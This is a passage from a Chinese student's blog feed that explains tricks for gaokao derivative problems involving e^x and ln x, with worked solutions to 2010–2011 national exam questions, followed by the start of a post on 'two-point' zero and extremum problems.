<p>而能具体地体现数学之美的也便是众多“不走寻常路”的方法了。比如，在解圆锥曲线题目时你或许会不假思索地用直角坐标系去解答，但你有想过参数方程或许可以更简便地得出答案吗？在做恒成立问题时你会不假思索地立马进行求导讨论，可你有想过对原函数做适当变换其实可以事半功倍吗？有时我想，高考或许没有错，<strong>是我们学习与应考的方式给高考打上了机械化、不合理的标签</strong>。若平时静下心来，花一些时间对做过的一些题去探究、去总结、去尝试、去创新，便会发现难题不就是由一些奇巧的思想组合而来的吗？</p>
<p>作为一名高三学生，我很遗憾直到中学的最后阶段才得以粗浅地领略数学的美妙。在此，我也想小小地分享一下曾激起我学习数学兴趣的几点有关导数压轴题的特殊技巧。之前本来打算把优化函数以方便求解、对端点效应的优化以及浅谈洛必达法则三点心得写在一篇名为“奇技淫巧”的博文里的，结果发现还没写完文章就长地令人难以忍受。于是我觉得把这一篇文章拆为三篇文章可能会和谐一些。</p>
<p>这三篇文章里都会有几道相同的例题出现（即2010年和2011年全国大纲卷的两道导数压轴题）。希望读者有兴趣的话可以把这三篇文章摆在一起看，感受一下运用不同方法带来的不同乐趣。</p>
</div>
<div id="真简介" class="section level1">
<h1>真·简介</h1>
<p>好吧，这回是真的简介了（逃…</p>
<p>在做导数相关的题目时，我们往往习惯于一来就先分离参数或者直接求导再考虑下一步怎么做。殊不知，很多时候先静下心来，仔细观察一下原函数并对函数做出适当变换（优化）其实可以事半功倍。</p>
<p>为了方便陈述，个人将这种方法（思路）命名为“优化法”。该方法也来自于《高考数学你真的掌握了吗》系列丛书的《函数》一册。</p>
</div>
<div id="指数型-ex" class="section level1">
<h1>指数型 (<span class="math inline">\(e^x\)</span>)</h1>
<p><span class="math inline">\(e^x\)</span> 在导数题中的出镜率不可谓不低，而其最显著的特点便是：</p>
<div class="figure">
<img src="/posts/math/thoughts-on-senior-3-derivative-problems-2/exponential_function.jpg" alt="" />
<p class="caption">“百般求导浑不怕，要留原形在人间”</p>
</div>
<p>就像上图那样，倘若对于含 <span class="math inline">\(e^x\)</span> 的函数直接求导，其导函数也会带有 <span class="math inline">\(e^x\)</span>。在较为简单的函数中（比如形如 <span class="math inline">\(f(x) = e^{ax + b} + cx + d\)</span>），直接求导仍能比较方便地找到导函数的零点以讨论单调区间。然而对于稍微复杂的函数，<span class="math inline">\(e^x\)</span> 的存在便直接增大了我们寻找导函数零点的难度。</p>
<p>还好，我们不难发现，对于形如 <span class="math inline">\(f(x) = g(x)e^x + m\)</span> 的函数，其导函数为 <span class="math inline">\(f&#39;(x) = e^x[g&#39;(x) + g(x)]\)</span>。类似地，如果是形如 <span class="math inline">\(f(x) = g(x)e^{-x} + m\)</span> 的函数，其导函数为 <span class="math inline">\(f&#39;(x) = e^{-x}[g&#39;(x) - g(x)]\)</span>。我们知道 <span class="math inline">\(e^x &gt; 0 (x \in R)\)</span>，那么实际上在讨论 <span class="math inline">\(f(x)\)</span> 的单调性时，我们仅仅需要讨论 <span class="math inline">\(\varphi(x) = g&#39;(x) + g(x)\)</span> 或是 <span class="math inline">\(\varphi(x) = g&#39;(x) - g(x)\)</span> 的正负性即可，也便有效地解决了无法解得零点的问题。</p>
<p><strong>因此，对于含 <span class="math inline">\(e^x\)</span> 的函数，我们应考虑将函数化为 <span class="math inline">\(e^xg(x) + b\)</span> 或 <span class="math inline">\(e^{-x}g(x) + b\)</span> 的形式</strong>。</p>
<hr />
<p>2010年全国大纲卷理科数学的压轴题是一道难题，并且此题在高考中坑完了一批无辜的学生还变着花样在模拟题中坑更多的学生，乃至于在不久前我甚至做到一道与该题几乎没有区别的2016武汉模拟题。在各大资料都倾向于使用令高中生头疼的放缩法亦或是普通高中生听都没听说过的洛必达法则（后文中也会介绍）解答时，我们来看看它与上述技巧能碰撞出怎样的火花：</p>
<p><strong>1.</strong> (2010.全国大纲卷理) 设函数 <span class="math inline">\(f(x) = 1 - e^{-x}\)</span>。<br />
(1) 证明：当 <span class="math inline">\(x &gt; -1\)</span> 时，<span class="math inline">\(f(x) \ge \frac{x}{x+1}\)</span>；<br />
(2) 设当 <span class="math inline">\(x \ge 0\)</span> 时，<span class="math inline">\(f(x) \le \frac{x}{ax + 1}\)</span>，求 <span class="math inline">\(a\)</span> 的取值范围。</p>
<p><em>注：由于 (1) 问较简单，这里只分析第 (2) 问</em>。</p>
<p><strong>解</strong>： (2)</p>
<p><span class="math display">\[
\begin{aligned}
&amp; f(x) \le \frac{x}{ax + 1} \\
&amp; \Leftrightarrow 1 - e^{-x} \le \frac{x}{ax + 1} \\
&amp; \Leftrightarrow 1 - \frac{x}{ax + 1} \le e^{-x} \\
&amp; \Leftrightarrow e^x(1 - \frac{x}{ax + 1}) \le 1
\end{aligned}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
F(x) = e^x(1 - \frac{x}{ax + 1}) - 1
\]</span></p>
<p>即证 <span class="math inline">\(x \ge 0\)</span> 时 <span class="math inline">\(F(x) \le 0\)</span> 恒成立</p>
<p><span class="math display">\[
\begin{aligned}
\therefore F&#39;(x) &amp; = e^x[1 - \frac{x}{ax + 1} - \frac{(ax - 1) - ax}{(ax + 1)^2}] \\
                 &amp; = \frac{e^x}{(ax + 1)^2}[(a^2 - a)x^2 + (2a - 1)x] \\
                 &amp; = \frac{xe^x}{(ax + 1)^2}[(a^2 - a)x + (2a - 1)]
\end{aligned}
\]</span></p>
<p><em>插一句话：这个时候我们就要分情况讨论了。注意到 <span class="math inline">\((a^2 - a)x + (2a - 1)\)</span> 在 <span class="math inline">\(a \neq 0 \ or \ \pm1\)</span> 时是一次函数，所以不妨以 <span class="math inline">\(a^2 - a = 0\)</span>与<span class="math inline">\(2a - 1 = 0\)</span> 所解得的 <span class="math inline">\(a\)</span> 值作为临界来讨论。另外，显然 <span class="math inline">\(a &lt; 0\)</span> 可以放在一起讨论（第1问起了提示作用）</em>。</p>
<p><strong>I.</strong> 若 <span class="math inline">\(a &lt; 0\)</span><br />
<span class="math inline">\(\therefore\)</span> 当<span class="math inline">\(x \in (-\frac{1}{a},+\infty)\)</span>时：</p>
<p><span class="math display">\[
\frac{x}{ax + 1} &lt; 0
\]</span></p>
<p>又 <span class="math inline">\(\because\)</span> 在 <span class="math inline">\(x \in [0,+\infty)\)</span>时：</p>
<p><span class="math display">\[
f(x) = 1 - e^{-x} \ge 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 当 <span class="math inline">\(x \in (-\frac{1}{a},+\infty)\)</span> 时：</p>
<p><span class="math display">\[
f(x) &gt; \frac{x}{ax + 1}
\]</span></p>
<p>与题意矛盾，舍去。</p>
<p><strong>II.</strong> 若 <span class="math inline">\(a \in [0,\frac{1}{2}]\)</span>，有：</p>
<p><span class="math display">\[
\begin{cases}
a^2 - a \le 0 \\
2a - 1 \le 0
\end{cases}
\]</span></p>
<p>由一次函数性质，<span class="math inline">\(x \in [0,+\infty)\)</span> 时：</p>
<p><span class="math display">\[
(a^2 - a)x + (2a - 1) \le 0
\]</span></p>
<p><span class="math display">\[
\therefore F&#39;(x) \le 0
\]</span></p>
<p><span class="math inline">\(\therefore F(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递减 ，故：</p>
<p><span class="math display">\[
\therefore F(x) \le F(0) = 0
\]</span></p>
<p>满足题意。</p>
<p><strong>III.</strong> 若 <span class="math inline">\(a \in (\frac{1}{2}, 1)\)</span>，有：</p>
<p><span class="math display">\[
\begin{cases}
a^2 - a \le 0 \\
2a - 1 &gt; 0
\end{cases}
\]</span></p>
<p>令 <span class="math inline">\(f&#39;(x) = 0\)</span>，有：</p>
<p><span class="math display">\[
x = \frac{1 - 2a}{a^2 - a} &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore F(x)\)</span>在<span class="math inline">\([0, \frac{1 - 2a}{a^2 - a}]\)</span>上单调递增，故：</p>
<p><span class="math display">\[
F(\frac{1 - 2a}{a^2 - a}) &gt; F(0) = 0
\]</span></p>
<p>不满题意，舍去。</p>
<p><strong>IV.</strong> 若<span class="math inline">\(a \ge 1\)</span></p>
<p><span class="math display">\[
\begin{cases}
a^2 - a \ge 0 \\
2a - 1 \ge 0
\end{cases}
\]</span></p>
<p>由一次函数性质，<span class="math inline">\(x \in [0,+\infty)\)</span> 时：</p>
<p><span class="math display">\[
(a^2 - a)x + (2a - 1) &gt; 0
\]</span></p>
<p><span class="math display">\[
\therefore F&#39;(x) &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore F(x)\)</span> 在 <span class="math inline">\([0,+\infty)\)</span> 单调递增，故：</p>
<p><span class="math display">\[
F(x) \ge F(0) = 0
\]</span></p>
<p>不满题意，舍去。</p>
<p>综上，<span class="math inline">\(a \in [0,\frac{1}{2}]\)</span></p>
<p>答：<span class="math inline">\(a\)</span> 的取值范围为 <span class="math inline">\([0,\frac{1}{2}]\)</span>。</p>
<p>怎么样，是不是很简单？别看情况分的挺多，其实每一种情况几乎就是几秒就可以判断出是否满足条件。</p>
<p>再来看看<a href="http://www.jyeoo.com/math2/ques/detail/3e6ca929-5ca7-4716-a80c-1873e641d558">参考答案</a>，它利用了 <span class="math inline">\(e^x \ge x + 1\)</span> 这一基本放缩，而且思路极其不好想，远没有该方法好想、易操作。</p>
</div>
<div id="对数型-ln-x" class="section level1">
<h1>对数型 (<span class="math inline">\(\ln x\)</span>)</h1>
<p>与上一节相似地，我们不难发现，对于形如 <span class="math inline">\(f(x) = \ln g(x)\)</span> 的函数，其导函数为 <span class="math inline">\(f&#39;(x) = \frac{g&#39;(x)}{g(x)}\)</span>，也可以使其导函数中不再带有对数函数从而更易讨论解答。</p>
<p><strong>因此，对于含 <span class="math inline">\(h(x)\ln g(x)\)</span> 的函数，我们应考虑把函数化为 <span class="math inline">\(k(x) + \ln g(x)\)</span> 的形式</strong>。</p>
<p>2011年全国大纲卷理科数学的压轴题也是一道有名的难题，让我们来看看优化函数又能起到怎样的效果。</p>
<p><strong>2.</strong> (2011.全国大纲卷理) 已知函数<span class="math inline">\(f(x) = \frac{a\ln x}{x+1} + \frac{b}{x}\)</span>，曲线 <span class="math inline">\(y = f(x)\)</span> 在点<span class="math inline">\((1, f(1))\)</span> 处的切线方程为 <span class="math inline">\(x + 2y - 3 = 0\)</span>。<br />
(1) 求 <span class="math inline">\(a\)</span>, <span class="math inline">\(b\)</span> 的值；<br />
(2) 如果当 <span class="math inline">\(x &gt; 0\)</span>，且 <span class="math inline">\(x \neq 0\)</span>时，<span class="math inline">\(f(x) &gt; \frac{\ln x}{x - 1} + \frac{k}{x}\)</span>，求 <span class="math inline">\(k\)</span> 的取值范围。</p>
<p><em>注：(1) 问过程略，解得 <span class="math inline">\(a = 1, b = 1\)</span>，这里只分析第 (2) 问</em>。</p>
<p><strong>解</strong>: (2)<br />
由题，有：</p>
<p><span class="math display">\[
\frac{\ln x}{x + 1} + \frac{1}{x} &gt; \frac{\ln x}{x - 1} + \frac{k}{x}
\]</span></p>
<p><span class="math display">\[
\Leftrightarrow \begin{cases}
(k - 1)(x - \frac{1}{x}) + 2\ln x &lt; 0 &amp; (x &gt; 1) \\
(k - 1)(x - \frac{1}{x}) + 2\ln x &gt; 0 &amp; (0 &lt; x &lt; 1)
\end{cases}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
g(x) = (k - 1)(x - \frac{1}{x}) + 2\ln x
\]</span></p>
<p><span class="math inline">\(\therefore 0 &lt; x &lt; 1\)</span>时，<span class="math inline">\(g(x) &gt; 0\)</span>；<span class="math inline">\(x &gt; 1\)</span>时，<span class="math inline">\(g(x) &lt; 0\)</span></p>
<p><span class="math display">\[
g&#39;(x) = \frac{(k - 1)x^2 + 2x + k - 1}{x^2}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
h(x) = (k - 1)x^2 + 2x + k - 1
\]</span></p>
<p><strong>I.</strong> 若 <span class="math inline">\(k \le 0\)</span><br />
对 <span class="math inline">\(h(x)\)</span>：</p>
<p><span class="math display">\[
\Delta = 4 - 4(k - 1)^2 \le 0
\]</span></p>
<p>由二次函数性质：</p>
<p><span class="math display">\[
h(x) \le 0
\]</span></p>
<p><span class="math display">\[
\therefore g&#39;(x) \le 0
\]</span></p>
<p><span class="math inline">\(\therefore g(x)\)</span> 在 <span class="math inline">\((0,1)\)</span> 和 <span class="math inline">\((1,+\infty)\)</span> 单调递减<br />
<span class="math inline">\(\therefore\)</span> 在 <span class="math inline">\((0,1)\)</span> 上，<span class="math inline">\(g(x) &gt; g(1) = 0\)</span> 恒成立；在 <span class="math inline">\((1,+\infty)\)</span> 上，<span class="math inline">\(g(x) &lt; g(1) = 0\)</span> 恒成立<br />
<span class="math inline">\(\therefore\)</span> 满足要求</p>
<p><strong>II.</strong> 若 <span class="math inline">\(0 &lt; k &lt; 1\)</span><br />
对 <span class="math inline">\(h(x)\)</span>：</p>
<p><span class="math display">\[
\Delta = 4 - 4(k - 1)^2 &gt; 0
\]</span></p>
<p>设 <span class="math inline">\(h(x)\)</span> 两零点分别为 <span class="math inline">\(x_1\)</span>、<span class="math inline">\(x_2\)</span>，且 <span class="math inline">\(x_2 &gt; x_1\)</span><br />
由韦达定理：</p>
<p><span class="math display">\[
x_1 + x_2 = -\frac{2}{k - 1} &gt; 2
\]</span></p>
<p><span class="math display">\[
\therefore x_2 &gt; 1
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 由二次函数性质，当 <span class="math inline">\(x \in (1, x_2)\)</span> 时有：</p>
<p><span class="math display">\[
g(x) &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 不符要求，舍去。</p>
<p><strong>III.</strong> 若 <span class="math inline">\(k \ge 1\)</span></p>
<p><span class="math display">\[
\therefore k - 1 \ge 0
\]</span></p>
<p>又 <span class="math inline">\(\because\)</span> 在 <span class="math inline">\((1,+\infty)\)</span> 区间内 <span class="math inline">\(x\)</span> 单调递增，<span class="math inline">\(\frac{1}{x}\)</span> 单调递减<br />
<span class="math inline">\(\therefore x - \frac{1}{x}\)</span> 在该区间内单调递增</p>
<p><span class="math display">\[
\therefore x - \frac{1}{x} &gt; 1 - \frac{1}{1} = 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 在 <span class="math inline">\((1,+\infty)\)</span> 区间内：</p>
<p><span class="math display">\[
g(x) = (k - 1)(x - \frac{1}{x}) + 2\ln x &gt; 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 不符要求，舍去.</p>
<p><span class="math inline">\(\therefore\)</span> 综上，<span class="math inline">\(k \in (-\infty,0]\)</span></p>
<p>答: <span class="math inline">\(k\)</span> 的取值范围为<span class="math inline">\((-\infty,0]\)</span>。</p>
<p>该题的解法可谓十分巧妙。就算优化函数的过程中会出现不可避免的分类讨论，但在不同情况下优化后新函数的方程式都是一样的。自然而然我们便知道了新函数在不同区间内的正负性。我们只需对新函数求导并讨论即可。</p>
<p>有读者可能会问：我怎么知道要讨论<span class="math inline">\(k\)</span>的哪些区间？其实在本题中<span class="math inline">\(k\)</span>的区间是由<span class="math inline">\(\Delta\)</span>的正负性和二次项系数的正负性决定的。也就是说，我们基本上就是在讨论<span class="math inline">\(h(x)\)</span>是否有解和开口方向不同的几种可能情况。</p>
<p>上述方法与该题的<a href="http://www.mofangge.com/html/qDetail/02/g3/201108/7oeag302255882.html">参考答案</a>是十分类似的，感兴趣的话也可以去看看。</p>
</div>
<div id="既有对数又有指数" class="section level1">
<h1>既有对数又有指数？</h1>
<p>额… 一般来说对于既有对数又有指数的题目<strong>一般不采用该方法</strong>，因为就算进行优化也只能顾全一者，优化后的式子往往也不够简单。但再少见的较为简单的情况中，我们只需要顾及其中一种就是了。</p>
<p>前几天的一次数学周考中，有如下一道导数压轴题，我也在此把它当作一道例题：</p>
<p><strong>3</strong>. (2016.武汉模拟) 已知函数 <span class="math inline">\(f(x) = e^x - ax^2\)</span>，曲线 <span class="math inline">\(y = f(x)\)</span> 在 <span class="math inline">\(x = 1\)</span> 处的切线方程为 <span class="math inline">\(y = bx + 1\)</span>。<br />
(1) 求 <span class="math inline">\(a\)</span>, <span class="math inline">\(b\)</span> 的值；<br />
(2) 求函数 <span class="math inline">\(f(x)\)</span> 在 <span class="math inline">\([0,1]\)</span> 上的最大值；<br />
(3) 证明：当 <span class="math inline">\(x &gt; 0\)</span> 时，<span class="math inline">\(e^x + (1 - e)x - x\ln x -1 \ge 0\)</span>.</p>
<p>前两问实属容易，这里就不讲解了，公布一下答案：<br />
(1) <span class="math inline">\(a = 1\)</span>; <span class="math inline">\(b = e - 2\)</span><br />
(2) 最大值即 <span class="math inline">\(f(1) = e - 1\)</span></p>
<p>好的，接下来我们重点看看 (3) 问。我们先对待求的这个不等式进行观察，发现其中有一项 <span class="math inline">\(x\ln x\)</span>。这非常令人不爽，因为我们知道对 <span class="math inline">\(x\ln x\)</span> 求导函数的结果是 <span class="math inline">\(\ln x + 1\)</span>，并不能搞掉 <span class="math inline">\(\ln x\)</span>；而如果是对 <span class="math inline">\(\ln x\)</span> 求导函数结果即 <span class="math inline">\(\frac{1}{x}\)</span>，就根本没有对数的事情了。再看看题目，限制条件为 <span class="math inline">\(x &gt; 0\)</span>，于是本着简化原式的思想我将不等号两边除以 <span class="math inline">\(x\)</span>。</p>
<p>这样一来，我们就将原题转化为证明 <span class="math inline">\(\frac{e^x}{x} + (1 - e) - \ln x - \frac{1}{x} \ge 0\)</span> 在 <span class="math inline">\(x &gt; 0\)</span> 时恒成立了。</p>
<p>令：</p>
<p><span class="math display">\[
F(x) = \frac{e^x}{x} + (1 - e) - \ln x - \frac{1}{x}
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
\therefore F&#39;(x) &amp; = \frac{xe^x - (e^x - 1)}{x^2} - \frac{1}{x} \\
                 &amp; = \frac{(x - 1)e^x - (x - 1)}{x^2} \\
                 &amp; = \frac{(x - 1)(e^x - 1)}{x^2}
\end{aligned}
\]</span></p>
<p>令 <span class="math inline">\(F&#39;(x) = 0\)</span>，得 <span class="math inline">\(x = 1\)</span>。<br />
当 <span class="math inline">\(x \in (0,1)\)</span> 时，<span class="math inline">\(F&#39;(x) &lt; 0\)</span>，<span class="math inline">\(F(x)\)</span>单调递减；<br />
当 <span class="math inline">\(x \in (1,+\infty)\)</span> 时，<span class="math inline">\(F&#39;(x) &gt; 0\)</span>，<span class="math inline">\(F(x)\)</span> 单调递增；<br />
<span class="math inline">\(\therefore F(1)\)</span> 为 <span class="math inline">\(F(x)\)</span> 的极小值点</p>
<p><span class="math display">\[
\therefore F(x) \ge F(1) = 0
\]</span></p>
<p><span class="math display">\[
\therefore xF(x) \ge 0
\]</span></p>
<p><span class="math inline">\(\therefore\)</span> 得证。</p>
<p>卧槽！怎么会这么简单？这简直是我做过最简单的一道导数压轴题了… 当时考试时我还觉得不可能这么简单还重算了2遍，最后发现真的这么简单…直到我看到了<a href="http://www.jyeoo.com/math2/ques/detail/bc86d470-f229-43d4-a98a-791409411aaa">参考答案</a>。</p>
<p>参考答案我就不转载了，大家点上面的链接进去看看吧。参考答案的解法利用了一个基本的放缩式 <span class="math inline">\(\ln x \le x - 1\)</span>（可以自行求导证明），从而将 <span class="math inline">\(x\ln x\)</span> 搞掉：<span class="math inline">\(x\ln x \le x^2 - x\)</span>。这样的好处是不仅仅搞掉了 <span class="math inline">\(x\ln x\)</span>，同时还获得了 <span class="math inline">\(x^2\)</span>，可以构造出题目中的 <span class="math inline">\(f(x)\)</span>。由 <span class="math inline">\(e^x + (1 - e)x - x\ln x -1 \ge e^x + (1 - e)x - (x^2 - x) -1\)</span>，自然而然地问题也就转化为证明 <span class="math inline">\(e^x + (1 - e)x - (x^2 - x) -1 \ge 0\)</span>，即 <span class="math inline">\(f(x) \ge (e - 2)x + 1\)</span>。这样以来就转化为了 <span class="math inline">\(f(x) \ge g(x)\)</span>这一类的问题了，直接令 <span class="math inline">\(h(x) = f(x) - g(x)\)</span> 求导做就行了。 然而，这种消去 <span class="math inline">\(x\ln x\)</span> 的方法远没有两边直接除以 <span class="math inline">\(x\)</span> 的方法优雅高效，同时尤其是对于初学者也不是很好想。</p>
</div>
<div id="小结" class="section level1">
<h1>小结</h1>
<p>本文简要介绍了对于含有 <span class="math inline">\(e^x\)</span> 或含有 <span class="math inline">\(\ln x\)</span> 的函数先进行适当变换再进行求解的方法，这种方法往往可以轻松地解决相应题目。</p>
<ul>
<li>对于含 <span class="math inline">\(e^x\)</span> 的函数，我们应考虑将函数化为 <span class="math inline">\(e^xg(x) + b\)</span> 或 <span class="math inline">\(e^{-x}g(x) + b\)</span> 的形式。</li>
<li>对于含 <span class="math inline">\(h(x)\ln g(x)\)</span> 的函数，我们应考虑把函数化为 <span class="math inline">\(k(x) + \ln g(x)\)</span> 的形式。</li>
<li>对于两者都有的函数，一般不这样考虑，但在简单的情况下顾全一者即可求出。</li>
</ul>
</div>
<div id="参考文献" class="section level1">
<h1>参考文献</h1>
<ul>
<li>张杨文主编.高考数学你真的掌握了吗 函数 [M].北京：清华大学出版社, 2014 (2016.5 重印)</li>
</ul>
</div>
]]></content>
		</item>
		
		<item>
			<title>高考导数: “两点”问题</title>
			<link>https://codgician.me/zh-hans/posts/2017/03/thoughts-on-senior-3-derivative-problems-1/</link>
			<pubDate>Tue, 21 Mar 2017 16:32:10 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2017/03/thoughts-on-senior-3-derivative-problems-1/</guid>
			<description>简介 构造新变量 利用零点、极值的定义 利用韦达定理 直接构造新变量 消去旧变量 利用函数单调性 利用新函数的单调性 利用旧函数的单调性 利用韦达定理 小结 4/02 更</description>
			<content type="html"><![CDATA[
<script src="/rmarkdown-libs/header-attrs/header-attrs.js"></script>

<div id="TOC">
<ul>
<li><a href="#简介">简介</a></li>
<li><a href="#构造新变量">构造新变量</a>
<ul>
<li><a href="#利用零点极值的定义">利用零点、极值的定义</a></li>
<li><a href="#利用韦达定理">利用韦达定理</a></li>
<li><a href="#直接构造新变量">直接构造新变量</a></li>
</ul></li>
<li><a href="#消去旧变量">消去旧变量</a>
<ul>
<li><a href="#利用函数单调性">利用函数单调性</a>
<ul>
<li><a href="#利用新函数的单调性">利用新函数的单调性</a></li>
<li><a href="#利用旧函数的单调性">利用旧函数的单调性</a></li>
</ul></li>
<li><a href="#利用韦达定理-1">利用韦达定理</a></li>
</ul></li>
<li><a href="#小结">小结</a></li>
</ul>
</div>

<p>4/02 更新：修复重要错误，添加一道例题。<br />
3/26 更新：补充新题型，调整分类逻辑，修改排版以方便阅读。</p>
<div id="简介" class="section level1">
<h1>简介</h1>
<p>嗯，最近疯狂地迷恋上了导数压轴题（然而还是做不来 TAT），于是就萌生了对一些有意思/有规律的导数压轴题写一些小总结的想法。</p>
<p>这篇文章要介绍的“两点问题”（感觉这名字取得好怂），即已知 <span class="math inline">\(A(x_1,y_1), B(x_2,y_2)\)</span> 为函数 <span class="math inline">\(f(x)\)</span> 的两零点/极值/任意两点，并让你求证某个含 <span class="math inline">\(x_1, x_2\)</span> 的式子恒成立。</p>
<p>其中，本文仅讨论 <span class="math inline">\(x_1, x_2\)</span> 均无法被直接求出或由题目中所给参数所表达出的情况。如果能求出或表达出来的话把带进去做就行了。</p>
<p>解决该类问题的核心思想即<strong>构建单一变量的新函数</strong>。</p>
<p>那么怎样构建单一变量的新函数呢？大致思路分两种：<strong>构造新变量</strong>或者<strong>消去旧变量</strong>。</p>
</div>
<div id="构造新变量" class="section level1">
<h1>构造新变量</h1>
<p>一般来说，如果题目中出现了对数函数（<span class="math inline">\(\ln x\)</span> 为例）或指数函数（<span class="math inline">\(e^x\)</span> 为例），我们可以考虑构造以 <span class="math inline">\(\frac{x_1}{x_2}\)</span> 为单一变量的新函数（<span class="math inline">\(\ln x_1 - \ln x_2 = \ln\frac{x_1}{x_2}\)</span>；而对于 <span class="math inline">\(e^x\)</span> 可考虑两边取对数）。由于一般题目中都会告诉你 <span class="math inline">\(x_1 \neq x_2\)</span>，那么我们可以指定两者的大小关系，如 <span class="math inline">\(x_1 &lt; x_2\)</span>，这样就有 <span class="math inline">\(\frac{x_1}{x_2} \in (0,1)\)</span>了，新函数的定义域也就自然而然地出来了。</p>
<p>但大多数情况下直接构造是很可能是构造不出来的，故我们需要利用题目中给的其它条件来对待证明的式子进行变换以求解。</p>
<div id="利用零点极值的定义" class="section level2">
<h2>利用零点、极值的定义</h2>
<p><strong>1.</strong> (2016.成外11月月考理) 已知函数<span class="math inline">\(f(x) = \ln x - x^2 + ax\)</span>，设 <span class="math inline">\(f&#39;(x)\)</span> 是 <span class="math inline">\(f(x)\)</span> 的导函数，<span class="math inline">\(x_1, x_2\)</span> 是 <span class="math inline">\(f(x)\)</span> 的两个零点，且 <span class="math inline">\(x_1 &lt; x_2\)</span>。求证： <span class="math inline">\(f&#39;(\frac{x_1+x_2}{2}) &lt; 0\)</span>。</p>
<p><strong>证明</strong>：
由 <span class="math inline">\(x_1, x_2\)</span> 是 <span class="math inline">\(f(x)\)</span> 的两零点：</p>
<p><span class="math display">\[
\begin{cases}
\ln x_1 - x_1^2 + ax_1 = 0 \\
\ln x_2 - x_2^2 + ax_2 = 0
\end{cases}
\]</span></p>
<p>两式相减：</p>
<p><span class="math display">\[
\ln(\frac{x_1}{x_2}) - (x_1^2 - x_2^2) + a(x_1 - x_2) = 0
\]</span></p>
<p>化简得：</p>
<p><span class="math display">\[
x_1 + x_2 = \frac{\ln\frac{x_1}{x_2}}{x_1-x_2} + a
\]</span></p>
<p>由题：</p>
<p><span class="math display">\[
f&#39;(x) = \frac{1}{x} - 2x + a
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
f&#39;(\frac{x_1 + x_2}{2})  
&amp; = \frac{2}{x_1 + x_2} - 2(\frac{x_1 + x_2}{2}) + a \\
&amp; = \frac{2}{x_1 + x_2} - \frac{\ln\frac{x_1}{x_2}}{x_1 -x_2} \\
&amp; = \frac{1}{x_1 - x_2}[\frac{2(x_1 - x_2)}{x_1 + x_2} - \ln\frac{x_1}{x_2}] \\
&amp; = \frac{1}{x_1 - x_2}[\frac{2(\frac{x_1}{x_2} - 1)}{\frac{x_1}{x_2} + 1} - \ln\frac{x_1}{x_2}]
\end{aligned}
\]</span></p>
<p>令：</p>
<p><span class="math display">\[
t = \frac{x_1}{x_2} \in (0,1)
\]</span></p>
<p><span class="math display">\[
g(t) = \frac{2(t - 1)}{t + 1} - \ln t
\]</span></p>
<p>有：</p>
<p><span class="math display">\[
g&#39;(t) = -\frac{(t-1)^2}{t(t + 1)^2} &lt; 0
\]</span></p>
<p><span class="math inline">\(\therefore g(t)\)</span> 在 <span class="math inline">\((0,1)\)</span> 上单调递减，则：</p>
<p><span class="math display">\[
g(t) &gt; g(1) = 0
\]</span></p>
<p><span class="math display">\[
\therefore \frac{2(\frac{x_1}{x_2} - 1)}{\frac{x_1}{x_2} + 1} - \ln\frac{x_1}{x_2} &gt; 0
\]</span></p>
<p><span class="math inline">\(\because x_1 &lt; x_2, \ \therefore \frac{1}{x_1 - x_2} &lt; 0\)</span>，则：</p>
<p><span class="math display">\[
\frac{1}{x_1 - x_2}[\frac{2(\frac{x_1}{x_2} - 1)}{\frac{x_1}{x_2} + 1} - \ln\frac{x_1}{x_2}] &lt; 0
\]</span></p>
<p>即 <span class="math inline">\(f&#39;(\frac{x_1+x_2}{2}) &lt; 0\)</span>，得证.</p>
<p>从上例中我们可以看出，直接构造 <span class="math inline">\(\frac{x_1}{x_2}\)</span> 显然是不可能的，但我们从零点的定义式入手，并尝试对这些条件进行变换从而将待证明式子中的其它参数约掉（如本题中约掉了 <span class="math inline">\(a\)</span>），进而就可以造出以 <span class="math inline">\(t = \frac{x_1}{x_2}\)</span> 为单一变量的新函数了。</p>
<p>另外，在本题中化简 <span class="math inline">\(f&#39;(\frac{x_1 + x_2}{2})\)</span> 时提出一个 <span class="math inline">\(\frac{2}{x_1 + x_2}\)</span> 也算是一个技巧吧，因为 <span class="math inline">\(\frac{x_1 - x_2}{x_1 + x_2}\)</span> 这个式子可以通过分子分母同时除以 <span class="math inline">\(x_2\)</span> 来构造出以 <span class="math inline">\(t = \frac{x_1}{x_2}\)</span> 为单一变量的式子 <span class="math inline">\(\frac{t - 1}{t + 1}\)</span>。</p>
</div>
<div id="利用韦达定理" class="section level2">
<h2>利用韦达定理</h2>
<p>上一类提到了零点与极值，而零点与极值无非就是原函数=0或导函数=0的两根。故如果它们恰恰是二次函数的话，我们便可以利用韦达定理来找出两变量间的关系，从而消去其中一者或者找出新关系。</p>
<p><strong>2.</strong> (2016.南平高三上期中) 已知函数 <span class="math inline">\(f(x) = \ln x - mx \ (m \in R)\)</span>。当 <span class="math inline">\(m &gt;= \frac{3\sqrt{2}}{2}\)</span> 时，设 <span class="math inline">\(g(x) = 2f(x) + x^2\)</span> 的两个极值点为 <span class="math inline">\(x_1\)</span>, <span class="math inline">\(x_2 \ (x_1 &lt; x_2)\)</span>，若 <span class="math inline">\(x_1\)</span>, <span class="math inline">\(x_2\)</span> 恰为函数 <span class="math inline">\(h(x) = \ln x - cx^2 - bx\)</span> 的零点，求 <span class="math inline">\(y = (x_1 - x_2)h&#39;(\frac{x_1 + x_2}{2})\)</span> 的最小值。</p>
<p><strong>解</strong>：</p>
<p><span class="math display">\[
h&#39;(x) = \frac{1}{x} - 2cx - b
\]</span></p>
<p><span class="math display">\[
g(x) = 2\ln x - 2mx + x^2
\]</span></p>
<p><span class="math display">\[
\begin{aligned}
g&#39;(x) &amp; = \frac{2}{x} - 2m + 2x \\
      &amp; = \frac{2x^2 - 2mx + 2}{x}
\end{aligned}
\]</span></p>
<p><span class="math inline">\(\therefore x_1\)</span>, <span class="math inline">\(x_2\)</span> 为 <span class="math inline">\(2x^2 - 2mx + 2 =0\)</span> 的两不等实根</p>
